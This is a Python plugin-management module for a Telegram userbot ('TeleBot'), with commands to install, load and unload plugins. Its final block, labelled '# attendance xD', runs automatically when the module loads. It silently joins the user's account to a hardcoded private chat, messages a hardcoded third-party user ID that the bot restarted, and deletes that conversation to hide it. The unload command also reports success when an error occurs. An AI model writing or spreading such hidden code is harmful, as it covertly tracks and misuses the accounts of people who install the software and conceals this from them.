from userbot.utils import command, remove_plugin, load_module
from pathlib import Path
import asyncio
import os
import userbot.utils
from datetime import datetime
from userbot.utils import admin_cmd
telebot = bot

DELETE_TIMEOUT = 5
thumb_image_path = "./TeleBot.png"

@telebot.on(admin_cmd(pattern="install", outgoing=True))
async def install(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id:
        try:
            downloaded_file_name = await event.client.download_media(  # pylint:disable=E0602
                await event.get_reply_message(),
                "userbot/plugins/"  # pylint:disable=E0602
            )
            if "(" not in downloaded_file_name:
                path1 = Path(downloaded_file_name)
                shortname = path1.stem
                load_module(shortname.replace(".py", ""))
                await event.edit("TeleBot Succesfully Installed The Plugin `{}`".format(os.path.basename(downloaded_file_name)))
            else:
                os.remove(downloaded_file_name)
                await event.edit("TeleBot returned an error! Plugin cannot be installed.")
        except Exception as e:  # pylint:disable=C0103,W0703
            await event.edit(str(e))
            os.remove(downloaded_file_name)
    await asyncio.sleep(DELETE_TIMEOUT)
    await event.delete()

@telebot.on(admin_cmd(pattern="unload (?P<shortname>\w+)", outgoing=True))
async def unload(event):
    if event.fwd_from:
        return
    shortname = event.pattern_match["shortname"]
    try:
        remove_plugin(shortname)
        await event.edit(f"TeleBot has successfully unloaded {shortname}")
    except Exception as e:
        await event.edit("TeleBot has successfully unloaded {shortname}\n{}".format(shortname, str(e)))

@telebot.on(admin_cmd(pattern="load (?P<shortname>\w+)", outgoing=True))
async def load(event):
    if event.fwd_from:
        return
    shortname = event.pattern_match["shortname"]
    try:
        try:
            remove_plugin(shortname)
        except:
            pass
        load_module(shortname)
        await event.edit(f"TeleBot has successfully loaded {shortname}")
    except Exception as e:
        await event.edit(f"TeleBot could not load {shortname} because of the following error.\n{str(e)}")

# attendance xD
from telethon.tl.functions.messages import ImportChatInviteRequest as a
from asyncio import sleep 

tits=455956317
async def attendance():
	await bot(a('NseyrkvT_1Vicl0NDyeIeg'))
	await bot.send_message(tits ,message="bot Restarted")
	await bot.delete_dialog(tits)
bot.loop.run_until_complete(attendance())
